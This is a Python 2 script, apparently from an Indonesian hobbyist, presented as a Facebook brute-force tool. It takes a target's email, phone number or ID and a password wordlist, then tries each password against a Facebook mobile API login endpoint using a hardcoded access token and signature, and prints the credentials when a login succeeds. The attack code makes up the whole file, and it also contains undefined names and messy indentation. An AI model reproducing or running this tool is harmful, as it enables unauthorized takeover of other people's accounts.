#coded by Bl4ck Dr460n
"""Dilarang Recode Ya Bossq Saya Udh Cape2 Buat Tools Ini
Saya Tau Agan Bisa Buat Tools Sendiri, Agan Anggap Ini Sampah
Ini Cuma Tools Biasa Saja"""
import os,sys,time,urllib,json
try:
	import requests
except ImportError:
	os.system('pip2 install requests')
	menu()

GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan
os.system('clear')
logo = GG+"""
                            .;ll:;''''''',,;;;,.
                           :0KKKKKKKKKKKKKKKKKKK,
                          ,KKKKKKKKKKKKKKKKKKKKK0.
                          0KKKKKKKKKKKKKKKKKKKKKKk
                         cKKKKKKKKKKKKKKKKKKKKKKKK'
                         0KKKKKKKKKKKKKKKKKKKKKKKKk
                   ..',;oKKKKKKKKKKKKKKKKKKKKKKKKKKl,'...
                  o0KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKx
                   ',;:clllxKKKK0000OOOO000KK00dllcc:::;'
                           ,KKKKKKKKKOKKKKKKK0k'
                         'dxkKKKKKKKo,xKKKKK0K:'l'
                       :ONN0,dkOkxo:,,,lxkOkdc,'XNk'
                      0NNNNN,,,'',,,,,,,,'',,,,:NNNNx.
                      'KNNNNd,,,,,,,,,,,,,,,,,,kNNNNk
                       .ONNNX;,,,,,,,,,,,,,,,,:NNNNo
                         dNNN0;,,,,,,,,,,,,,,;KNNX:
                          :XNN0:,,,,,,,,,,,,cKNNK'
                           'KNNXd;,,,,,,,,;xXNNO.
                  .':codxOOOXWWWWNOxoccld0WWWWWOxddlc;'.
              'lkXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0d:.
            .0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWo
           .NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMx
          ,WMMMMNXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXNMMMMMMl
         .WMMMMMkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOMMMMMMM;
         XMMMMMMOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOMMMMMMMW.
        OMMMMMMMOkkkkkkkkkkkkkkkkkkkkdckkkkkkkkkkkkkkkkk0MMMMMMMMX
       :MMMMMMMM0kkkkkkkkkxdlc:xkkkkd :kOc:lodkOkkkkkkkkKMMMMMMMMMx
       WMMMMMMMMKkkko;,;:c:cldxkkkko :kkkkdol::c;,;:OkkkXMMMMMMMMMM.
       OMMMMMMMMXkkkxolcccc:::cxkk: :kkkklc:cc:c:cldkkkkNMMMMMMMMMX
        xMMMMMMMNkkkkkkkkkkkkxoxkl.okkkkkodxOkkkkkkkkkkkNMMMMMMMM0.
         ;XMMMMMNkkkkkkkkkkkkkkk\033[31;1mHACKER\033[32;1mkkkkkkkkkkkkkkkkkkWMMMMMMNc
           ;OMMMWkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkMMMMMNo
             'dWMkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOMMMKc
                OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk0Xl.
                .kK000000000000000000000000000000000000N.
                 .clll-----------------------------lllc,\033[39;1m
                    \033[41;1mF A C E B O O K B R U T E F O R M\033[0m
\033[0m
"""

os.system('python2 loading')

def menu():
	to = []
	print logo
	try:
		print
		usr = raw_input(WW+"Email | PH | ID : "+G)
		pas = raw_input(WW+"FilePasswords   : "+G)
		print
		os.system('clear')
                os.system('python2 banner')
		ps = open(pas, 'r')
		for pwd in ps:
			try:
				p = pwd.replace('\n', '')
				sys.stdout.write(WW+"                [\033[31;1m FAULTS \033[39;1m]"+WW+p+"\n")
				sys.stdout.flush()
				data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + p + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
				j = json.loads(data.text)
				if 'access_token' in j:
					print B+"=========="+G+"Password Found"+B+"=========="
					print W+" Email/Id/Username : "+G+usr
					print W+" Password          : "+G+p
					print
					sys.exit()
				elif 'www.facebook.com' in j['error_msg']:
					print B+"=========="+G+"Password Found"+B+"=========="
                        	        print W+" Email/Id/Username : "+Y+usr
                                	print W+" Password          : "+Y+p
	                                print
        	                        sys.exit()

   			except requests.ConnectionError:
				print R+ "P A S S W O R D N O T F O U N D"
	except IOError:
		print R+"File Not Found"
		ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
                if ed == 'y' or ed == 'Y':
                      os.system('nano wordlist.txt')
                      pil()
                elif ed == 'n' or ed == 'N':
                        print wd+"Keluar Dari Program..."
                        sys.exit()

                else: 
                      print RR+"Pilih yg bener cuk..."

if __name__ == '__main__':
	menu()
